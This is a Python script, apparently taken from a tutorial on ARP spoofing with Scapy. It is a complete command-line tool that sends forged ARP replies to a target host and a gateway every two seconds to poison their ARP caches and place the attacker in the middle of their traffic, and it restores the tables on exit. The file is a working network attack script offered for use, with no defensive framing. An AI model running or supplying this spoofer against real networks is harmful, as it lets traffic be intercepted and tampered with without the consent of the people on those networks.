# https://codeonby.com/2021/06/12/arp-spoofing-with-scapy/

from scapy.all import ARP, send, sr1
import time
import sys


def get_mac(ip):
  # Create an ARP request packet to get the MAC address of the target IP
  arp_request = ARP(pdst=ip)
  response = sr1(arp_request, timeout=1, verbose=False)
  if response:
    return response.hwsrc
  else:
    return None


def spoof(target_ip, host_ip):
  # Create an ARP response packet to spoof the target
  target_mac = get_mac(target_ip)
  if not target_mac:
    print(f"Could not find MAC address for IP: {target_ip}")
    return
  arp_response = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=host_ip)
  send(arp_response, verbose=False)
  print(f"Sent ARP spoof packet to {target_ip} pretending to be {host_ip}")


def restore(target_ip, host_ip):
  # Restore the network by sending the correct ARP response
  target_mac = get_mac(target_ip)
  host_mac = get_mac(host_ip)
  if not target_mac or not host_mac:
    print("Could not find MAC address. Skipping restore.")
    return
  arp_response = ARP(op=2, pdst=target_ip, hwdst=target_mac,
             psrc=host_ip, hwsrc=host_mac)
  send(arp_response, count=4, verbose=False)
  print(f"Restored ARP table for {target_ip}")


if __name__ == "__main__":
  if len(sys.argv) != 3:
    print("Usage: python arp_spoofer.py <target_ip> <host_ip>")
    sys.exit(1)

  target_ip = sys.argv[1]
  host_ip = sys.argv[2]

  try:
    print("Starting ARP spoofing... Press Ctrl+C to stop.")
    while True:
      spoof(target_ip, host_ip)
      spoof(host_ip, target_ip)
      time.sleep(2)
  except KeyboardInterrupt:
    print("\nDetected Ctrl+C! Restoring network...")
    restore(target_ip, host_ip)
    restore(host_ip, target_ip)
    print("Network restored. Exiting.")
    sys.exit(0)
